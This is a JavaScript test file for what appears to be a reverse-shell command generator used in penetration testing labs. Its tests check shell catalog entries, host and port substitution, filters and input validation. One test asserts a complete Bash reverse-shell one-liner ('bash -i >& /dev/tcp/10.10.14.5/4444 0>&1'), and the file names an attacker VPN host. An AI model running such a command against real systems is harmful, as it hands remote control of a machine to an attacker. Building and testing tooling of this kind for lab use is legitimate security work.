// Run with `pnpm test`. The generator layer is pure and imports nothing from
// the app, so Node's test runner executes it after a small TypeScript compile
// (the project's own typescript dependency), with no test framework added.
import assert from "node:assert/strict"
import { readFileSync } from "node:fs"
import { describe, test } from "node:test"
import ts from "typescript"

function read(relative) {
  return readFileSync(new URL(relative, import.meta.url), "utf8")
}

// catalog.ts and filters.ts both import from "@/lib/...", which a data: URL
// cannot resolve. `import type` is erased by tsc anyway; the one runtime
// import (filters pulling SHELLS from catalog) is satisfied by concatenating
// the two sources and dropping every reverse-shell import line first.
const combined = [read("./catalog.ts"), read("./filters.ts")]
  .join("\n\n")
  .replace(/^import\s[^\n]*@\/lib\/tools\/reverse-shell\/[^\n]*\n/gm, "")
const js = ts.transpileModule(combined, {
  compilerOptions: {
    module: ts.ModuleKind.ESNext,
    target: ts.ScriptTarget.ES2022,
  },
}).outputText
const {
  SHELLS,
  generate,
  generateAll,
  resolveConfig,
  HOST_PLACEHOLDER,
  PORT_PLACEHOLDER,
  FILTERS,
  filterShells,
  filterCounts,
  validateHost,
  validatePort,
} = await import(
  `data:text/javascript;base64,${Buffer.from(js).toString("base64")}`
)

const config = { host: "10.10.14.5", port: "4444" }
const byId = (id) => SHELLS.find((shell) => shell.id === id)

describe("catalog", () => {
  test("has a broad set of unique, well-formed shells", () => {
    assert.ok(SHELLS.length >= 15)
    assert.equal(new Set(SHELLS.map((s) => s.id)).size, SHELLS.length)
    for (const shell of SHELLS) {
      assert.ok(shell.name && shell.description && shell.language)
      assert.ok(["linux", "windows", "cross-platform"].includes(shell.platform))
      assert.equal(typeof shell.template, "function")
    }
  })

  test("generates the canonical Bash one-liner", () => {
    assert.equal(
      generate(byId("bash-i"), config),
      "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
    )
  })

  test("substitutes host and port everywhere they belong", () => {
    for (const shell of SHELLS) {
      const out = generate(shell, config)
      assert.ok(out.includes("10.10.14.5"), `${shell.id} has the host`)
      assert.ok(out.includes("4444"), `${shell.id} has the port`)
      // The listener values must not leak the raw placeholders when set.
      assert.ok(!out.includes(HOST_PLACEHOLDER))
      assert.ok(!out.includes(PORT_PLACEHOLDER))
    }
  })

  test("reacts to changed values with no stale output", () => {
    const first = generate(byId("python3"), config)
    const second = generate(byId("python3"), {
      host: "10.10.14.20",
      port: "9001",
    })
    assert.notEqual(first, second)
    assert.ok(second.includes("10.10.14.20") && second.includes("9001"))
    assert.ok(!second.includes("10.10.14.5") && !second.includes("4444"))
  })

  test("shows placeholders when a field is blank", () => {
    assert.deepEqual(resolveConfig({ host: "", port: "" }), {
      host: HOST_PLACEHOLDER,
      port: PORT_PLACEHOLDER,
    })
    assert.ok(
      generate(byId("bash-i"), { host: "", port: "4444" }).includes(
        HOST_PLACEHOLDER
      )
    )
  })

  test("brackets an IPv6 host inside /dev/tcp", () => {
    assert.ok(
      generate(byId("bash-i"), { host: "dead::beef", port: "9001" }).includes(
        "/dev/tcp/[dead::beef]/9001"
      )
    )
  })

  test("copy-all joins commands under name comments, no metadata", () => {
    const all = generateAll([byId("bash-i"), byId("python3")], config)
    assert.match(all, /^# Bash -i\nbash -i/)
    assert.ok(all.includes("\n\n# Python 3\n"))
    assert.ok(!all.includes("Interactive")) // descriptions stay out
  })
})

describe("filters", () => {
  test("All shows everything; platform filters narrow", () => {
    assert.equal(filterShells("all", "").length, SHELLS.length)
    assert.ok(
      filterShells("windows", "").every((s) => s.platform === "windows")
    )
    assert.ok(
      filterShells("python", "").every((s) => s.tags.includes("python"))
    )
  })

  test("counts match the filtered lengths", () => {
    const counts = filterCounts()
    for (const filter of FILTERS) {
      assert.equal(counts[filter.id], filterShells(filter.id, "").length)
    }
  })

  test("search matches name, language, platform and tags", () => {
    assert.ok(filterShells("all", "python").length >= 2)
    assert.ok(
      filterShells("all", "netcat").every((s) => s.tags.includes("netcat"))
    )
    assert.equal(filterShells("all", "no-such-shell-xyz").length, 0)
  })
})

describe("validation", () => {
  test("accepts IPv4, IPv6 and hostnames", () => {
    assert.ok(validateHost("10.10.14.5").valid)
    assert.ok(validateHost("dead::beef").valid)
    assert.ok(validateHost("attacker.tun0.vpn").valid)
    assert.ok(validateHost("localhost").valid)
  })

  test("rejects nonsense hosts but allows an empty field", () => {
    assert.equal(validateHost("not a host!").valid, false)
    assert.ok(validateHost("not a host!").error)
    assert.equal(validateHost("").valid, false)
    assert.ok(validateHost("").hint && !validateHost("").error)
  })

  test("ports: numeric and in range", () => {
    assert.ok(validatePort("4444").valid)
    assert.ok(validatePort("1").valid && validatePort("65535").valid)
    assert.match(validatePort("70000").error, /between 1 and 65535/)
    assert.match(validatePort("4x").error, /number/)
    assert.ok(validatePort("").hint && !validatePort("").error)
  })
})
